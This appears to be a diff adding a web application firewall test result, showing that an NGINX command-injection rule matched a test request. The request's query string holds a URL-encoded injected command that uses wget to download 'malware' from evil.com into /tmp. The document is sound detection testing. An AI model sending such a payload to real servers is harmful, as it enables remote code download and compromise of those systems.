@@ -1,0 +1,3 @@
+Expected Rule: [NGINX CMDi] Command injection via semicolon
+Matched Rule: [NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772193327673-4ji1pg pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1
+Rule Match: ✅ Match
